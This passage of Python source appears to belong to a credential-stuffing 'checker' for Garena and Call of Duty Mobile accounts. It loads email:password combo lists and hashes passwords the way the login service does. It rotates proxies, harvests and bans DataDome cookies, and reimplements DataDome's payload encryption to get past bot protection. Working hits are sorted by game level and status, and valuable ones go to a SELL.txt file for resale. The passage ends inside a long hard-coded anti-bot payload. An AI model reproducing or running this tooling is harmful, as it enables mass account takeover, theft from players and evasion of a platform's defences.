            lines.append("─" * width)
            lines.append("◈  CONNECTED GAMES")
            lines.append("None")
        lines.append("◆" + "─" * dashes + " @lleessiee " + "─" * (width - 2 - dashes - len(' @lleessiee ')) + "◆")
        return "\n".join(lines)

def save_clean_or_notclean(is_clean, shell, result_folder, formatted_text, codm_info=None, account=None, password=None, country=None, live_stats=None):
    try:
        os.makedirs(result_folder, exist_ok=True)
        plain_text = re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', formatted_text)
        with FILE_LOCK:
            if codm_info:
                try:
                    codm_level = int(float(str(codm_info.get('codm_level', 0))))
                except:
                    codm_level = 0
                if codm_level <= 99:
                    status_level_range = "1-99.txt"
                elif codm_level <= 199:
                    status_level_range = "100-199.txt"
                elif codm_level <= 299:
                    status_level_range = "200-299.txt"
                else:
                    status_level_range = "300-400.txt"
                status_folder = os.path.join(result_folder, 'CLEAN' if is_clean else 'NOT-CLEAN')
                os.makedirs(status_folder, exist_ok=True)
                file_path = os.path.join(status_folder, status_level_range)
                with open(file_path, "a", encoding="utf-8") as f:
                    f.write(plain_text + "\n ________________________ \n\n")
            else:
                file_path = os.path.join(result_folder, 'NO_CODM.txt')
                with open(file_path, "a", encoding="utf-8") as f:
                    f.write(plain_text + "\n ________________________ \n\n")
            try:
                shell_val = int(float(str(shell).strip()))
                if shell_val > 0:
                    shells_folder = os.path.join(result_folder, 'SHELLS')
                    os.makedirs(shells_folder, exist_ok=True)
                    if shell_val <= 99:
                        shell_file = '1-99.txt'
                    elif shell_val <= 199:
                        shell_file = '100-199.txt'
                    elif shell_val <= 299:
                        shell_file = '200-299.txt'
                    elif shell_val <= 399:
                        shell_file = '300-399.txt'
                    elif shell_val <= 499:
                        shell_file = '400-499.txt'
                    else:
                        shell_file = '500+.txt'
                    with open(os.path.join(shells_folder, shell_file), "a", encoding="utf-8") as sf:
                        sf.write(plain_text + "\n ________________________ \n\n")
            except:
                pass
            if codm_info and codm_info.get('codm_nickname') and codm_info.get('codm_nickname') != 'N/A':
                try:
                    codm_level = int(float(str(codm_info.get('codm_level', 0))))
                except:
                    codm_level = 0
                region = codm_info.get('region', 'N/A').upper()
                country_code = country.upper() if country and country != 'N/A' else region
                if country_code == 'N/A' or not country_code or country_code == 'NONE':
                    country_code = region if region and region != 'N/A' else 'UNKNOWN'
                if codm_level <= 49:
                    level_range = "1-49"
                elif codm_level <= 99:
                    level_range = "50-99"
                elif codm_level <= 199:
                    level_range = "100-199"
                elif codm_level <= 299:
                    level_range = "200-299"
                else:
                    level_range = "300-400"
                folder_path = os.path.join(result_folder, "COUNTRY", country_code)
                os.makedirs(folder_path, exist_ok=True)
                with open(os.path.join(folder_path, f"{level_range}.txt"), "a", encoding="utf-8") as f:
                    f.write(plain_text + "\n ________________________ \n\n")
                if 90 <= codm_level <= 400 and account and password:
                    status_str = "CLEAN" if is_clean else "NOT CLEAN"
                    ign = codm_info.get('codm_nickname', 'N/A')
                    uid = codm_info.get('uid', 'N/A')
                    flag = get_flag(country_code)
                    flag_str = f" {flag}" if flag else ""
                    sell_line = f"{account}:{password} |\nSHELLS: {shell} | LEVEL: {codm_level} | IGN: {ign} | UID: {uid} | COUNTRY: {country_code}{flag_str} | STATUS: {status_str}\n\n"
                    sell_path = os.path.join(result_folder, "SELL.txt")
                    with open(sell_path, "a", encoding="utf-8") as sf:
                        sf.write(sell_line)
            if live_stats and codm_info:
                try:
                    c_lvl = int(float(str(codm_info.get('codm_level', 0))))
                except:
                    c_lvl = 0
                live_stats.add_hit(c_lvl, plain_text)
    except:
        pass

class Stats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.checked_count = 0
        self.total_count = 0
        self.highest_shells = 0
        self.highest_level = 0
        self.highest_clean = 0
        self.highest_not_clean = 0
        self.start_time = time.time()
        self.lock = Lock()
        self.categorized_levels = {"1-49": 0, "50-99": 0, "100-199": 0, "200-299": 0, "300-400": 0}
        self.countries = []
        self.valid_hits = []
        self.error_count = 0

    def add_hit(self, level, text):
        with self.lock:
            self.valid_hits.append({'level': level, 'text': text})

    def update_highest(self, shells, level, is_clean=None):
        with self.lock:
            try:
                s = int(float(str(shells).strip()))
                if s > self.highest_shells:
                    self.highest_shells = s
            except:
                pass
            try:
                l = int(float(str(level).strip()))
                if l > self.highest_level:
                    self.highest_level = l
                if is_clean is True and l > self.highest_clean:
                    self.highest_clean = l
                if is_clean is False and l > self.highest_not_clean:
                    self.highest_not_clean = l
            except:
                pass

    def add_codm_details(self, level, country):
        with self.lock:
            if country and country != 'N/A':
                self.countries.append(country)
            try:
                lvl = int(level)
                if 1 <= lvl <= 49:
                    self.categorized_levels["1-49"] += 1
                elif 50 <= lvl <= 99:
                    self.categorized_levels["50-99"] += 1
                elif 100 <= lvl <= 199:
                    self.categorized_levels["100-199"] += 1
                elif 200 <= lvl <= 299:
                    self.categorized_levels["200-299"] += 1
                elif 300 <= lvl <= 400:
                    self.categorized_levels["300-400"] += 1
            except:
                pass

    def update_stats(self, valid=False, clean=False, has_codm=False, is_error=False):
        with self.lock:
            self.checked_count += 1
            if is_error:
                self.error_count += 1
                self.invalid_count += 1
            elif valid:
                self.valid_count += 1
                if clean:
                    self.clean_count += 1
                else:
                    self.not_clean_count += 1
                if has_codm:
                    self.has_codm_count += 1
                else:
                    self.no_codm_count += 1
            else:
                self.invalid_count += 1

    def set_total(self, total):
        self.total_count = total

    def get_stats(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            checked = self.valid_count + self.invalid_count
            if self.total_count > 0:
                progress = (checked / self.total_count * 100)
            else:
                progress = 0
            return {
                'valid': self.valid_count,
                'invalid': self.invalid_count,
                'clean': self.clean_count,
                'not_clean': self.not_clean_count,
                'has_codm': self.has_codm_count,
                'no_codm': self.no_codm_count,
                'checked': checked,
                'total': self.total_count,
                'elapsed': elapsed,
                'progress': progress,
                'high_shell': self.highest_shells,
                'high_lvl': self.highest_level,
                'high_clean': self.highest_clean
            }

    def push_result(self, success: bool, is_clean: bool = False, has_codm: bool = False, codm_level: int = 0, error_reason: str = ''):
        pass

    def pop_result(self):
        return None

def find_and_list_account_files():
    combo_dir = 'Combo'
    if not os.path.exists(combo_dir):
        os.makedirs(combo_dir)
        return None
    file_details = []
    for filename in os.listdir(combo_dir):
        file_path = os.path.join(combo_dir, filename)
        if os.path.isfile(file_path) and filename.endswith(".txt"):
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    line_count = sum(1 for _ in f if _.strip())
                file_size = os.path.getsize(file_path)
                file_details.append((file_path, file_size, line_count))
            except:
                pass
    if not file_details:
        return None
    print(f"\n  {WARM_GRAY}╔{'═' * 61}╗{RESET}")
    title = " SELECT A COMBO FILE"
    print(f"  {WARM_GRAY}║{OCHRE}{title}{RESET}{' ' * (61 - len(title))}{WARM_GRAY}║{RESET}")
    print(f"  {WARM_GRAY}╠══════╦═══════════════════════════════════╦═════════╦════════╣{RESET}")
    print(f"  {WARM_GRAY}║{SOFT_WHITE} NO.  {WARM_GRAY}║{SOFT_WHITE} FILENAME                          {WARM_GRAY}║{SOFT_WHITE} SIZE    {WARM_GRAY}║{SOFT_WHITE} LINES  {WARM_GRAY}║{RESET}")
    for i, (path, size, count) in enumerate(file_details, 1):
        name = os.path.basename(path)
        if len(name) > 33:
            name = name[:30] + '...'
        size_str = format_size(size)
        count_str = f"{count:,}"
        print(f"  {WARM_GRAY}╠══════╬═══════════════════════════════════╬═════════╬════════╣{RESET}")
        c1_text = f"[ {i} ]".center(6)
        c1 = f"{OCHRE}{c1_text}{RESET}"
        c2_text = f" {name}"
        c2 = f"{SOFT_WHITE}{c2_text}{RESET}{' ' * max(0, 35 - len(c2_text))}"
        c3_text = f" {size_str}"
        c3 = f"{OCHRE}{c3_text}{RESET}{' ' * max(0, 9 - len(c3_text))}"
        c4_text = f" {count_str}"
        c4 = f"{SAGE}{c4_text}{RESET}{' ' * max(0, 8 - len(c4_text))}"
        print(f"  {WARM_GRAY}║{c1}{WARM_GRAY}║{c2}{WARM_GRAY}║{c3}{WARM_GRAY}║{c4}{WARM_GRAY}║{RESET}")
    print(f"  {WARM_GRAY}╚══════╩═══════════════════════════════════╩═════════╩════════╝{RESET}\n")
    return [item[0] for item in file_details]

def prompt_for_duplicate_removal(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        original_count = len(lines)
        unique_lines = list(dict.fromkeys([line for line in lines if line.strip()]))
        duplicates_removed = original_count - len(unique_lines)
        if duplicates_removed > 0:
            with open(file_path, 'w', encoding='utf-8') as f:
                f.writelines(unique_lines)
            _log('SUCCESS', f'Removed {duplicates_removed} duplicate line(s).')
        else:
            _log('INFO', 'No duplicates were found.')
    except Exception as e:
        _log('ERROR', f'Error during duplicate removal: {e}')

def select_input_file_flow(show_auto_remove=False):
    selected_file_path = None
    while True:
        available_files = find_and_list_account_files()
        if available_files:
            try:
                choice_str = input(f"  {WARM_GRAY}➤{OCHRE} SELECT COMBO FILE [1-{len(available_files)}] : {SOFT_WHITE}").strip()
                print(RESET, end="")
                if not choice_str:
                    continue
                file_choice = int(choice_str) - 1
                if 0 <= file_choice < len(available_files):
                    selected_file_path = available_files[file_choice]
                    break
                else:
                    _log('ERROR', 'Invalid number.')
                    time.sleep(5)
            except (ValueError, IndexError):
                _log('ERROR', 'Invalid input.')
                time.sleep(1)
        else:
            input(f"  {OCHRE}No combo found in 'Combo' folder. Press Enter to refresh...{RESET}")
    if show_auto_remove:
        auto_choice = input(f"  {WARM_GRAY}➤{OCHRE} AUTO-REMOVE CHECKED LINES? [Y/N] : {SOFT_WHITE}").strip()
        print(RESET, end="")
        print()
        return selected_file_path, (auto_choice.lower() == 'y')
    print()
    return selected_file_path

def sanitize_string(text):
    if not text or text == 'N/A':
        return text
    try:
        return text.encode('ascii', errors='ignore').decode('ascii')
    except:
        return re.sub('[^\\x00-\\x7F]+', '', str(text))

def clean_account_line(line):
    if not line:
        return (None, None)
    line = line.strip().lstrip('\ufeff\ufffe')
    line = ''.join((char for char in line if char.isprintable() or char == ':'))
    if ':' not in line:
        return (None, None)
    try:
        parts = line.split(':', 1)
        if len(parts) != 2:
            return (None, None)
        account = parts[0].strip()
        password = parts[1].strip()
        account = sanitize_string(account)
        password = sanitize_string(password)
        if not account or not password:
            return (None, None)
        return (account, password)
    except:
        return (None, None)

def format_codm_region(region_code):
    if not region_code or region_code == 'N/A':
        return 'N/A'
    region_code = region_code.upper()
    region_info = CODM_REGIONS.get(region_code)
    if region_info:
        return f"{region_info['flag']} {region_info['name']} ({region_code})"
    else:
        return f'{region_code}'

def format_mobile_number(mobile_no, country_code=None):
    if not mobile_no or mobile_no == 'N/A' or (not str(mobile_no).strip()):
        return 'N/A'
    mobile_str = str(mobile_no).strip()
    mobile_str = mobile_str.replace('+', '').replace(' ', '').replace('-', '')
    if country_code:
        country_code = str(country_code).strip()
        if not mobile_str.startswith(country_code):
            if mobile_str.startswith('0'):
                mobile_str = country_code + mobile_str[1:]
            else:
                mobile_str = country_code + mobile_str
    detected_country_code = None
    for code_key, region_info in CODM_REGIONS.items():
        code = region_info['code']
        if mobile_str.startswith(code):
            detected_country_code = code
            break
    if detected_country_code:
        local_number = mobile_str[len(detected_country_code):]
        if len(local_number) >= 4:
            masked = '*' * (len(local_number) - 4) + local_number[-4:]
            return f'+{detected_country_code} {masked}'
        else:
            return f'+{detected_country_code} {local_number}'
    elif len(mobile_str) >= 4:
        masked = '*' * (len(mobile_str) - 4) + mobile_str[-4:]
        return f'+{masked}'
    else:
        return mobile_str

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': DUSTY_ROSE,
        'INFO': SOFT_WHITE,
        'WARNING': OCHRE,
        'ERROR': TERRACOTTA,
        'CRITICAL': TERRACOTTA
    }
    ICONS = {
        'DEBUG': '⊡',
        'INFO': 'ℹ',
        'WARNING': '⚠',
        'ERROR': '✖',
        'CRITICAL': '☠'
    }
    RESET = RESET
    def format(self, record):
        levelname = record.levelname
        color = self.COLORS.get(levelname, '')
        icon = self.ICONS.get(levelname, '·')
        tag = f'{levelname:<8}'
        if color:
            record.msg = f'{color}{icon} {tag}{self.RESET} {record.msg}'
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.INFO)
logging.getLogger('urllib3').setLevel(logging.ERROR)
logging.getLogger('requests').setLevel(logging.ERROR)

class DataDomeGenerator:

    def init(self, key: str, cookie: str):
        self.key = key
        self.cookie = cookie
        self.t = 9959949970
        self.n = 1789537805

    def _hash_str_to_int(self, s: str) -> int:
        if not s:
            return self.n
        o = 0
        for char in s:
            o = (o << 5) - o + ord(char) & 4294967295
        return o

    def _prng_h(self, n: int) -> int:
        n ^= n << 13
        n ^= n >> 17 & 4294967295
        n ^= n << 5
        return n & 4294967295

    def _create_keystream_generator(self, seed1: int, seed2: int):
        e = seed1
        i = -1
        r = seed2
        a = True
        u = None

        def generator(get_val: bool=False) -> int:
            nonlocal e, i, r, a, u
            if u is not None:
                t = u
                u = None
                return t
            i += 1
            if i > 2:
                e = self._prng_h(e)
                i = 0
            t = e >> 16 - 8 * i & 255
            if a:
                r -= 1
                t ^= r & 255
            if get_val:
                u = t
            return t
        a = False
        return generator

    def _custom_b64_encode_char(self, n: int) -> int:
        if 37 < n:
            return 59 + n
        if 11 < n:
            return 53 + n
        if 1 < n:
            return 46 + n
        return 50 * n + 45

    def generate_payload(self, data: dict[str, any], timestamp: int) -> str:
        seed_from_cookie = self._hash_str_to_int(self.cookie)
        initial_seed = self.t ^ seed_from_cookie ^ self._hash_str_to_int(self.key)
        e = self._prng_h(self._prng_h((timestamp >> 3 ^ 11027890091) * self.t))
        keystream_gen_a = self._create_keystream_generator(initial_seed, e)
        payload_bytes = []
        is_first = True

        def stringify(val: Any) -> str:
            return json.dumps(val)

        def encrypt_str(s: str) -> List[int]:
            buffer = s.encode('utf-8')
            encrypted = []
            for byte in buffer:
                encrypted.append(byte ^ keystream_gen_a())
            return encrypted
        for key, value in data.items():
            if not is_first:
                payload_bytes.append(keystream_gen_a() ^ 44)
            key_bytes = encrypt_str(stringify(key))
            value_bytes = encrypt_str(stringify(value))
            payload_bytes.extend(key_bytes)
            payload_bytes.append(keystream_gen_a() ^ 58)
            payload_bytes.extend(value_bytes)
            is_first = False
        keystream_gen_b = self._create_keystream_generator(1809053797 ^ self._hash_str_to_int(self.cookie), e)
        final_bytes = [byte ^ keystream_gen_b() for byte in payload_bytes]
        final_bytes.append(keystream_gen_a(True) ^ 125 ^ keystream_gen_b())
        result_chars = []
        w = 0
        b = e
        while w < len(final_bytes):
            b = b - 1 & 4294967295
            byte1 = b & 255 ^ final_bytes[w]
            w += 1
            b = b - 1 & 4294967295
            byte2 = b & 255 ^ final_bytes[w] if w < len(final_bytes) else 0
            w += 1
            b = b - 1 & 4294967295
            byte3 = b & 255 ^ final_bytes[w] if w < len(final_bytes) else 0
            w += 1
            z = byte1 << 16 | byte2 << 8 | byte3
            result_chars.append(chr(self._custom_b64_encode_char(z >> 18 & 63)))
            result_chars.append(chr(self._custom_b64_encode_char(z >> 12 & 63)))
            result_chars.append(chr(self._custom_b64_encode_char(z >> 6 & 63)))
            result_chars.append(chr(self._custom_b64_encode_char(z & 63)))
        padding = len(final_bytes) % 3
        if padding > 0:
            return ''.join(result_chars[:-(3 - padding)])
        return ''.join(result_chars)

class ProxyManager:
    def __init__(self, enabled=True, fallback_url=None, proxy_file="proxies.txt"):
        self.enabled = enabled
        self.proxies = []
        self._index = 0
        self._counter = 0
        self._lock = threading.Lock()

        if not enabled:
            return

        if fallback_url:
            self.proxies = [fallback_url]
        elif proxy_file and Path(proxy_file).exists():
            self._load_from_file(proxy_file)

    def _load_from_file(self, proxy_file):
        with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                url = _parse_proxy_line(line)
                if url:
                    self.proxies.append(url)

    def get_next(self):
        if not self.enabled or not self.proxies:
            return None
        with self._lock:
            proxy = self.proxies[self._index % len(self.proxies)]
            self._index += 1
            self._counter += 1
        return {'http': proxy, 'https': proxy}

    def is_loaded(self):
        return self.enabled and len(self.proxies) > 0

    def get_count(self):
        return len(self.proxies)

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.live_cookies = deque()
        self.lock = threading.Lock()
        self.load_banned_cookies()
        self.load_initial_cookies()

    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set((line.strip() for line in f if line.strip()))

    def load_initial_cookies(self):
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                for line in f:
                    cookie = line.strip()
                    if cookie and cookie not in self.banned_cookies:
                        self.live_cookies.append(cookie)

    def is_banned(self, cookie):
        return cookie in self.banned_cookies

    def mark_banned(self, cookie_value):
        formatted_cookie = cookie_value if 'datadome=' in cookie_value else f'datadome={cookie_value}'
        with self.lock:
            if formatted_cookie in self.live_cookies:
                self.live_cookies.remove(formatted_cookie)
            if formatted_cookie not in self.banned_cookies:
                self.banned_cookies.add(formatted_cookie)
                threading.Thread(target=self._append_to_file, args=('banned_cookies.txt', formatted_cookie), daemon=True).start()

    def get_valid_cookies(self):
        with self.lock:
            cookies = list(self.live_cookies)
            if cookies:
                random.shuffle(cookies)
            return cookies

    def save_cookie(self, datadome_value):
        if not datadome_value:
            return False
        val = datadome_value.strip()
        formatted_cookie = val if val.startswith('datadome=') else f'datadome={val}'
        with self.lock:
            if formatted_cookie not in self.banned_cookies and formatted_cookie not in self.live_cookies:
                self.live_cookies.append(formatted_cookie)
                threading.Thread(target=self._append_to_file, args=('fresh_cookie.txt', formatted_cookie), daemon=True).start()
                return True
        return False

    def _append_to_file(self, filename, content):
        try:
            with open(filename, 'a') as f:
                f.write(content + '\n')
        except Exception:
            pass

def _parse_proxy_line(raw: str) -> str | None:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    if re.match(r"^(https?|socks[45])://", raw, re.IGNORECASE):
        parsed = urllib.parse.urlparse(raw)
        if parsed.hostname and parsed.port:
            return raw
        return None
    if "@" in raw:
        return "http://" + raw
    parts = raw.split(":")
    if len(parts) == 2 and parts[1].isdigit():
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        a, b, c, d = parts
        if b.isdigit():
            host, port, user, pw = a, b, c, d
        elif d.isdigit():
            user, pw, host, port = a, b, c, d
        else:
            return None
        return f"http://{urllib.parse.quote(user, safe='-._~')}:{urllib.parse.quote(pw, safe='-._~')}@{host}:{port}"
    return None

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(';'):
        item = item.strip()
        if not item:
            continue
        if '=' in item:
            try:
                key, value = item.split('=', 1)
                cookie_dict[key.strip()] = value.strip()
            except ValueError:
                pass
    session.cookies.update(cookie_dict)

def init_ga_cookies(session):
    timestamp = int(time.time())
    random_id = random.randint(1000000000, 9999999999)
    ga_cookies = {
        '_ga': f'GA1.1.{random_id}.{timestamp}',
        '_ga_XB5PSHEQB4': f'GS2.1.s{timestamp}$o1$g0$t{timestamp}$j53$l0$h0',
        '_ga_1M7M9L6VPX': f'GS2.1.s{timestamp}$o6$g0$t{timestamp}$j60$l0$h0'
    }
    for name, value in ga_cookies.items():
        session.cookies.set(name, value, domain='.garena.com')
    return ga_cookies

_ip_wait_lock = threading.Lock()
_ip_wait_active = False
_ip_wait_event = threading.Event()
_suppress_ip_prints = False
_ip_block_callback = None

def get_datadome_cookie(session, proxies=None):
    url = 'https://datadome.garena.com/js/'

    timestamp = int(time.time())
    random_id = random.randint(1000000000, 9999999999)

    headers = {
        'content-length': '6374',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-mobile': '?1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'accept': '*/*',
        'origin': 'https://sso.garena.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://sso.garena.com/',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-PH,en-US;q=0.9,en;q=0.8',
        'cookie': f'_ga_1M7M9L6VPX=GS2.1.s{timestamp}$o21$g1$t{timestamp}$j53$l0$h0; _ga=GA1.1.{random_id}.{timestamp}'
    }

    payload = {
        'jspl': 'QGQ0BVgjckhG9XFf_olrvPEwB5AKErtjUd6f_dtbCw6uU4mUnl4Ca5uJY9K_OWQfTtT2EcX852pDG2IId4gG5U65OppS7iwx7RfQ1zzKRMro56Xwcuu9Q_K16c69frRlWlLQd-n0p6XgiRXwusJv0AzdM9tBXrKAChlwUPvgd1086UwD5VEdfQXn-_xJN7-6-7Fs2LBt0A7vW4CPF6iCHCIKFJHbFFo8uTxvSdJL69AHKqqrRJ8oQCkfO_GrZiTFCXZAbGwdCqzkFEGFeBGH0RVAG_q7wmiKlII3zlcqZcRgoP2awfU6RjhvIeJToH5rTrby8SGuCZXLAGCG2tcCxraVYDQEL63p5anIGBrdTwdGVE6yL8B4vXNXLTIO0iq0AWjCksq599tQ38RAgo0tMl6cix0pOUwpigTNKY-4eIEEaQ2Cn_Nr9eXTrqRWZOaszlStMIE8M73ErsI_6dLXI5tcohL1NA0k6dPyVhurkMtYjUodgDN0EluJufLMKvH_D6-JT9xIebqCZ2zPv2eOO5wcMC1TyHFjR3NGwpJvD-YghfQUxdmFd3Xcjc41Rcp21CZ2HVsFZME-B8ppZ7AyU3Mn-ETydYWauETEamzkZynKSMKQTys-SrbONsKCbmQiGUxDumBKsPR8ODY87U_QKs3icJeXPheiBv-0w40kMiBU7KLYOrH0wCcGPO4pWS5bl9ju2KF3nMwD5V5AajCqdotm-JU7qAZxJiPAtU9xZmqr-mDQELX56jokfmqkX8v_4YZeAdx0VU96Rpj_-qdvhKpzm9OYZeJI-4VVLhXN200cEumhRfyVp5HZ3pUdUYxgp0ryCydj31kG8dLTDCKTIhMtsUo3bSypcbsE-xdz-P-gUNUYXcTN7uuekhuKwNIeEcTcLdw6udGartLTkTt4SmWxncPDzKwLh6qdhdRVAJIhlbeFY_OeIF4TkCPbGEv9xlN3MJFZccX097QLDT9niyMzxACRar3aPJDzZlaoyyr0asFkNu65-Hfj_XLYlSYET7vC-Sqgzo5016flXcuzKZvMfJp9Jk78GRUtYtVPHEJzMdU0SMcKTp8joR8Y_mmyHIOnoGer4TatyOfNCRF8XOJNdMwp3qSknYp_yfBSUa1Ij3WPtX9lg5kl50YJgNQPovYyCJU_Dwjty_KirEFgbUoOT7yr7w5pJc7yBC2n3wfTxiwmp-RsBwZXlk19UYDiGwWTMA5EfglURLVraue7Df36AEQV5QqBVupNtGpZFwPC5K9YJDG5DIlIMNfIL4X8chGhxCMV6nem-otHDi9JUkcVbTttqrJyXQ50FNfRwUt_ScqwsXVEBD26I-AD6xsdkqmCx60ehJMXiSywNE_Mjt9zG4TUoHKY95gpcXDSvcSVJ6W-rCAQ3M0vcgu5wcdEb1SXmBzUJf_rSJxZoFNPdZjgrQqVBByJKy2V7x4ywPpPPf83z0Y6B7gkW6RS7fUlT47SSjvtkXGYoRLn9zDcOtvX1TxxUXrDjw4H9T5n7zOy5Eao7BQ9fcDgZ1pyYH6soR9Ug2MsOX5cHCH5LMC7qZtDW0aFKLD76LNMcZfWxn_tiadU3JynnXwkZ8B70leGLWoe9azUJY0F_xgD6tgCKf1xxJQAtcuUU1PTHG_kIFhD_UrZiq4DKhIMZgvkSgwEvpYmHOnpRZMoqOn2T81bwz1jhDq3H0YJClW2y0Bzk_cvMEZOb05kS3cHr0fcVGnLkqxGWWsT9YVRbNueDhbZIoPfdiOpqn9ZTOpxKFxwEuEeKaPSfb6A7PUAHREieN9hpCdlmZwygPw3sHpK0jdD-hKUTiG3d-xOr2Tc9-QVtSy_mdR_rSdMDvXEJsVZJ33f6SaKsnsElaLd2vB8YZfUaTksujLUBqgxd4gSKUdcEZ-_-8huvk9MJFsw37KqHYVCCmdHzJe_KjC6GZx4UGskD1amFPKYTp7Q4H9U-RIflTDX3K8Pxced7Kx4W-7tDt8V5wj6ggRDK_wAZ_8fxpjrH7PhEyTTeJxB_bJ2Sigbjoi368mAoudRMkiChN66D8xap_nYUCtBkdFDZpThAv04leKOllua60DS5W1KL91x9CYMPmKQUWMHFVY6MqPaUsecHxDK1WujPkCnSGKpr0iiEHNpbC_5atdvXmS2dVjyih1fXxpnwW5-uyybBQKkhWXcI6HXC5ic6J4sBra17lvvBfff4sAw_FohvjPwNUCW4fUKz8qrLXYWuhTtsgzCdwXKnNbAJHFg5RPiAR3sDj6eIPJlRSv3foRh656t3015JAetowe7J2l7a_UBRmkQmZerVBEh8LCgU_BqE1Kz4ibHWHBPcBSRZVzCmfUXVUWWaYfAtBUIkz4n0TNDf3MjhksOpda2sKiJ97w7lZDPA_46hiFhfM6SP8y9GV7ToaXGxY-rsDGKxUXvCmk73l5YbxfaHfGhMpKxsSCaj40MFKyCNydU7Wn9Eha1bNW0CdenKkrTcJgpfgHkOKSjIFJMJzElcE1TWTYWxlqJqKHnMw9GmQFPe0JiYSf_NWtU2AFv7cjqCeYU6EOWN6yNMPCpIKHapVzCpwSxVmdywJYwFpte2kcu0RDICFHL1_ocSPF83azDEAcyb2sK6hu5WBR9mB-KGKnBzkktfo7TSvrq05d6jQInG3jxnFULmdvyUhIf7Wh9PoO48psknM85XQ3gCMMUlqyBw0TcsGaik-DLyFnoWo2bQW9vpPhmxO_wtQ6YBfQpIRsJlDexBaLWFX7KpWOr4wgX-0jviPLsXOGSWUQ-e6PxflfbEOB6hYdBL7uJhRO7QA8wsLvnUUxdLY7mxqzCJF2_l_O2a_Sdw7MId_KjEerVYj0VHm9svX7RdrrnS2DzbXyXzRGOy8l6OzQoDUAQRfyV2mjZgpYPxQry2G3P538x4zw-k_JNsy39rhjM0-uCTQ1d7YapQx3W20R3CxSPgk4tiu7sIKQxs-QpnHTKetaGW4MJEreDRZ_h8_oukyvaFPpItE9Yc8SIt1T-2RkAnDNXBA-g287V6lo6v_nNh7mGYC3Lx4qeG26aAsR3oX9SiSCuAp8Lyahw4Q2yPo4NTvsxLuY_b7SzMybfyQVXOCzHRx9VrQXWrTQ3iFvC1o49YQdta8tG1SA15bvhD5IpVcHi6HduW7SEll7Uk1l6hvg8GwwkDSsAqXa7Rsu7g5GL_hI-GaAP1R7VK3iD_TXLAnRoETWh56dMqw4l_QqKCggCA-WSj3WKIXcDnuTtnZragribanEi7_F_DL2q0OHuD1KqzY7c8eouznfNmOHASe_GwrcIVMr-XT1Rf5huXlnQ1l8eqgqQR1oQkc_K3ihzMJM8L_Vhd0_KLR4-1ICSL1QdOSboLjH2nVuzc7je6FyRyNOUBSZU1sT5caMBnNllX4FRwduqGSje9X6XY8a5vYd5Kpgp3AyrPv8gVLExQguIGFa-4IbLmjsM1B6UEj4VTcFM8RJ221_n3KuVDl5X-_g2rW3GHP8zUPlkYOmlJ5Z0GQ8ubDGe14nAAA9H-Rop4TaNFkMup3EOr3Ec6_GvPxzET3lcdP9qF6FdYmY9Ejhr18yGFZfDf3w3y_K7PRfRkEsdliiCSvYosgssIs8jB2VzL3HEbwwjCz_aKZT0W9NYkBxAi8cZf676phGbEJ50hoYRSIwJJU8Tu0A0hrUnkvw3Woc-88SWO4ZlpAxUZXiuFtfhQxbO1SXxByBTaWdJ9GkxriyF0zg8TQeOoZFi5ad-FLPfriP1DitrrITsJKPN-hpORrNd0yjGf9D_-9vD4Mvm8IzkEbzNpX4VHVhrwFLlpk6aeME9q01T-CX5PqmkoVk4cZihcoQe-i96Mcy-umgshZdAyxckIjGFv_vWQYxghUwNTMOotHXbx58RJQQ8QY2FoSyVbTpUXM7yL8_xLT5mh4N_qx66Gpw0t7mSUDSIB992q3vugspQWO2UKy1j5gw8UzlmgYvNTOcR5pRav6Zp-we0685y8IdrKbwH0dm6ZnSSmAlw0WD-YveLDEWJgcFYE94fkZ83czXgJb7I-JrLiyHk7K7aSmXkII-60Fm1ksQayHbJsvnzmXzbaWtp2tgCmM1hqahSnXN_eaUTaDumK9-e-iobjOXcYPERFwssEA_zrRvXFdoiINmqtwVi4so7quVBEMsjyOPsN4WjfgJo39il-yBMVlpBYMxZjZrzoxBU6RaNq3Vn2xz9PTIUnpqFm1V2wAdH-gJNvravSZxWRd8e2ub5SMBJEddGHZMmY2oaxlI1XgsNg9FLFm78WqOP3oqvjpoNPAUeKu6IbDRtuwKEZEQjBCYrih9zELsUYUD2vDr9r4JxSY2_SRx1Istk-z6cm6blTyybiBsrT3t-uULM4VHKBQGcOKF10aeZJkvclKSxI-kUIu97evHkFKcXG6mWRGXt0rzkPCzm12Dm6dLdkS1p4nQGGmlxNf913DXotB7EsBc62ddI